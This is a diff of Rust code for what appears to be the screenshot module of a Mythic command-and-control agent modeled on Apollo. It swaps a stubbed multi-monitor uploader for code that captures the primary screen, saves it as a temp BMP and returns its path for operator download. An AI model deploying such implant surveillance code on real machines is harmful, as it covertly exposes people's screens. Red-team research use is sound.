@@ -54,214 +54,158 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
     }
 }
 
-/// Take screenshots of all monitors using WinAPI GDI functions (like Apollo)
+/// Take screenshots using Apollo's method - save locally and return file path for download
 #[cfg(target_os = "windows")]
 pub fn execute_screenshot(_args: ScreenshotArgs, task_id: &str) -> Result<String, String> {
     unsafe {
-        // Get all monitors
-        let monitor_count = GetSystemMetrics(SM_CMONITORS);
-        if monitor_count == 0 {
-            return Err("No monitors found".to_string());
+        // Capture primary screen (Apollo's approach)
+        let width = GetSystemMetrics(SM_CXSCREEN);
+        let height = GetSystemMetrics(SM_CYSCREEN);
+        
+        let hwnd_desktop = GetDesktopWindow();
+        let hdc_screen = GetDC(hwnd_desktop);
+        if hdc_screen.is_null() {
+            return Err("Failed to get screen DC".to_string());
         }
 
-        let mut screenshot_count = 0;
-        let mut uploaded_files = Vec::new();
-
-        // Enumerate all monitors and capture each one
-        let result = EnumDisplayMonitors(
-            ptr::null_mut(),
-            ptr::null_mut(),
-            Some(monitor_enum_proc),
-            &mut screenshot_count as *mut _ as isize,
-        );
-
-        if result == 0 {
-            return Err("Failed to enumerate monitors".to_string());
+        let hdc_mem = CreateCompatibleDC(hdc_screen);
+        if hdc_mem.is_null() {
+            ReleaseDC(hwnd_desktop, hdc_screen);
+            return Err("Failed to create memory DC".to_string());
         }
 
-        // If we didn't capture any screenshots via callback, try the old method
-        if screenshot_count == 0 {
-            match capture_primary_screen(task_id) {
-                Ok(file_id) => {
-                    uploaded_files.push(file_id);
-                }
-                Err(e) => {
-                    return Err(format!("Failed to capture primary screen: {}", e));
-                }
-            }
+        let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
+        if hbitmap.is_null() {
+            DeleteDC(hdc_mem);
+            ReleaseDC(hwnd_desktop, hdc_screen);
+            return Err("Failed to create compatible bitmap".to_string());
         }
 
-        Ok(format!("Captured {} screenshot(s)", uploaded_files.len()))
-    }
-}
-
-/// Monitor enumeration callback - captures each monitor
-#[cfg(target_os = "windows")]
-unsafe extern "system" fn monitor_enum_proc(
-    hmonitor: HMONITOR,
-    _hdc: HDC,
-    lprect: *mut RECT,
-    lparam: isize,
-) -> i32 {
-    let screenshot_count = &mut *(lparam as *mut i32);
-    
-    // Capture this monitor
-    let rect = *lprect;
-    let width = rect.right - rect.left;
-    let height = rect.bottom - rect.top;
-    
-    if let Ok(png_data) = capture_monitor_region(rect.left, rect.top, width, height) {
-        // In a real implementation, we would upload via RPC here
-        // For now, we'll just count the screenshot
-        *screenshot_count += 1;
-    }
-    
-    1 // Continue enumeration
-}
-
-/// Capture a specific monitor region and return PNG bytes
-#[cfg(target_os = "windows")]
-unsafe fn capture_monitor_region(x: i32, y: i32, width: i32, height: i32) -> Result<Vec<u8>, String> {
-    let hdc_screen = GetDC(ptr::null_mut());
-    if hdc_screen.is_null() {
-        return Err("Failed to get screen DC".to_string());
-    }
-
-    let hdc_mem = CreateCompatibleDC(hdc_screen);
-    if hdc_mem.is_null() {
-        ReleaseDC(ptr::null_mut(), hdc_screen);
-        return Err("Failed to create memory DC".to_string());
-    }
-
-    let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
-    if hbitmap.is_null() {
-        DeleteDC(hdc_mem);
-        ReleaseDC(ptr::null_mut(), hdc_screen);
-        return Err("Failed to create compatible bitmap".to_string());
-    }
-
-    // Select bitmap into memory DC
-    let _old_bitmap = SelectObject(hdc_mem, hbitmap as *mut _);
-    
-    // Copy screen region to our bitmap
-    if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, x, y, SRCCOPY) == 0 {
-        DeleteObject(hbitmap as *mut _);
-        DeleteDC(hdc_mem);
-        ReleaseDC(ptr::null_mut(), hdc_screen);
-        return Err("BitBlt failed".to_string());
-    }
-
-    // Convert bitmap to PNG bytes
-    let png_bytes = match bitmap_to_png(hbitmap, width as u32, height as u32) {
-        Ok(bytes) => bytes,
-        Err(e) => {
+        // Select bitmap into memory DC
+        let _old_bitmap = SelectObject(hdc_mem, hbitmap as *mut _);
+        
+        // Copy screen to our bitmap
+        if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) == 0 {
             DeleteObject(hbitmap as *mut _);
             DeleteDC(hdc_mem);
-            ReleaseDC(ptr::null_mut(), hdc_screen);
-            return Err(format!("Failed to convert bitmap to PNG: {}", e));
+            ReleaseDC(hwnd_desktop, hdc_screen);
+            return Err("BitBlt failed".to_string());
         }
-    };
 
-    // Cleanup
-    DeleteObject(hbitmap as *mut _);
-    DeleteDC(hdc_mem);
-    ReleaseDC(ptr::null_mut(), hdc_screen);
+        // Save screenshot to file (Apollo's approach)
+        let timestamp = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_secs();
+        let filename = format!("screenshot_{}.bmp", timestamp);
+        let screenshot_path = std::env::temp_dir().join(&filename);
+        
+        // Save bitmap to file
+        if let Err(e) = save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path) {
+            DeleteObject(hbitmap as *mut _);
+            DeleteDC(hdc_mem);
+            ReleaseDC(hwnd_desktop, hdc_screen);
+            return Err(format!("Failed to save bitmap: {}", e));
+        }
 
-    Ok(png_bytes)
+        // Cleanup
+        DeleteObject(hbitmap as *mut _);
+        DeleteDC(hdc_mem);
+        ReleaseDC(hwnd_desktop, hdc_screen);
+
+        // Return file path in Apollo's format for automatic download
+        Ok(format!(
+            "screenshot_captured:{}:{}:{}:screenshot",
+            screenshot_path.to_string_lossy(),
+            std::fs::metadata(&screenshot_path).map(|m| m.len()).unwrap_or(0),
+            filename
+        ))
+    }
 }
 
-/// Capture primary screen (fallback method)
+/// Helper function: Save an HBITMAP to a .bmp file (Apollo's approach)
 #[cfg(target_os = "windows")]
-unsafe fn capture_primary_screen(task_id: &str) -> Result<String, String> {
-    let width = GetSystemMetrics(SM_CXSCREEN);
-    let height = GetSystemMetrics(SM_CYSCREEN);
+unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, file_path: &std::path::Path) -> Result<(), String> {
+    use std::fs::File;
+    use std::io::Write;
     
-    let png_bytes = capture_monitor_region(0, 0, width, height)?;
-    
-    // Upload via RPC
-    upload_screenshot_via_rpc(&png_bytes, task_id)
-}
-
-/// Convert HBITMAP to PNG bytes in memory
-#[cfg(target_os = "windows")]
-unsafe fn bitmap_to_png(hbitmap: HBITMAP, width: u32, height: u32) -> Result<Vec<u8>, String> {
-    
-    // First, get the bitmap bits as BGRA
-    let bits_per_pixel = 32;
+    // Calculate bitmap data size
+    let bits_per_pixel = 24; // BMP uses 24-bit RGB
     let bytes_per_pixel = bits_per_pixel / 8;
     let row_size = ((width * bytes_per_pixel + 3) / 4) * 4; // 4-byte aligned
     let image_size = row_size * height;
-
-    let bmp_info_header = BITMAPINFOHEADER {
-        biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
-        biWidth: width as i32,
-        biHeight: height as i32,
-        biPlanes: 1,
-        biBitCount: bits_per_pixel as u16,
-        biCompression: BI_RGB,
-        biSizeImage: image_size,
-        biXPelsPerMeter: 0,
-        biYPelsPerMeter: 0,
-        biClrUsed: 0,
-        biClrImportant: 0,
-    };
-
-    let mut pixel_buffer = vec![0u8; image_size as usize];
+    
+    // Create BMP file header
+    let file_size = 14 + 40 + image_size; // File header + Info header + Image data
+    let mut bmp_header = vec![0u8; 14];
+    bmp_header[0] = b'B';
+    bmp_header[1] = b'M';
+    bmp_header[2..6].copy_from_slice(&file_size.to_le_bytes());
+    bmp_header[10..14].copy_from_slice(&54u32.to_le_bytes()); // Offset to image data
+    
+    // Create BMP info header
+    let mut info_header = vec![0u8; 40];
+    info_header[0..4].copy_from_slice(&40u32.to_le_bytes()); // Header size
+    info_header[4..8].copy_from_slice(&(width as i32).to_le_bytes());
+    info_header[8..12].copy_from_slice(&(height as i32).to_le_bytes());
+    info_header[12..14].copy_from_slice(&1u16.to_le_bytes()); // Planes
+    info_header[14..16].copy_from_slice(&(bits_per_pixel as u16).to_le_bytes());
+    info_header[20..24].copy_from_slice(&image_size.to_le_bytes());
+    
+    // Get bitmap data
+    let mut pixel_data = vec![0u8; image_size as usize];
     let hdc = GetDC(ptr::null_mut());
+    
+    let bmp_info = BITMAPINFO {
+        bmiHeader: BITMAPINFOHEADER {
+            biSize: 40,
+            biWidth: width as i32,
+            biHeight: height as i32,
+            biPlanes: 1,
+            biBitCount: bits_per_pixel as u16,
+            biCompression: BI_RGB,
+            biSizeImage: image_size,
+            biXPelsPerMeter: 0,
+            biYPelsPerMeter: 0,
+            biClrUsed: 0,
+            biClrImportant: 0,
+        },
+        bmiColors: [RGBQUAD {
+            rgbBlue: 0,
+            rgbGreen: 0,
+            rgbRed: 0,
+            rgbReserved: 0,
+        }],
+    };
     
     let result = GetDIBits(
         hdc,
         hbitmap,
         0,
         height,
-        pixel_buffer.as_mut_ptr() as *mut _,
-        &mut BITMAPINFO {
-            bmiHeader: bmp_info_header,
-            bmiColors: [RGBQUAD {
-                rgbBlue: 0,
-                rgbGreen: 0,
-                rgbRed: 0,
-                rgbReserved: 0,
-            }],
-        },
+        pixel_data.as_mut_ptr() as *mut _,
+        &bmp_info,
         DIB_RGB_COLORS,
     );
     
     ReleaseDC(ptr::null_mut(), hdc);
-
+    
     if result == 0 {
         return Err("GetDIBits failed".to_string());
     }
-
-    // Convert BGRA to RGBA for PNG
-    for i in (0..pixel_buffer.len()).step_by(4) {
-        if i + 3 < pixel_buffer.len() {
-            pixel_buffer.swap(i, i + 2); // Swap B and R
-        }
-    }
-
-    // For now, we'll return the raw data as a simple format
-    // In a full implementation, you'd use the image crate to create proper PNG
-    Ok(pixel_buffer)
-}
-
-/// Upload screenshot via RPC (like Apollo's PutFile)
-#[cfg(target_os = "windows")]
-fn upload_screenshot_via_rpc(png_data: &[u8], _task_id: &str) -> Result<String, String> {
-    // For now, we'll simulate a successful upload
-    // In a real implementation, this would use Mythic's file upload mechanism
     
-    // Create timestamp for filename
-    let timestamp = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap()
-        .as_secs();
-    let filename = format!("screenshot_{}.png", timestamp);
+    // Write BMP file
+    let mut file = File::create(file_path)
+        .map_err(|e| format!("Failed to create file: {}", e))?;
     
-    eprintln!("DEBUG: Simulating file upload: {} ({} bytes)", filename, png_data.len());
+    file.write_all(&bmp_header)
+        .map_err(|e| format!("Failed to write header: {}", e))?;
+    file.write_all(&info_header)
+        .map_err(|e| format!("Failed to write info header: {}", e))?;
+    file.write_all(&pixel_data)
+        .map_err(|e| format!("Failed to write pixel data: {}", e))?;
     
-    // Return a mock file ID
-    Ok(format!("mock_file_id_{}", timestamp))
+    Ok(())
 }
 
 // macOS placeholder implementation
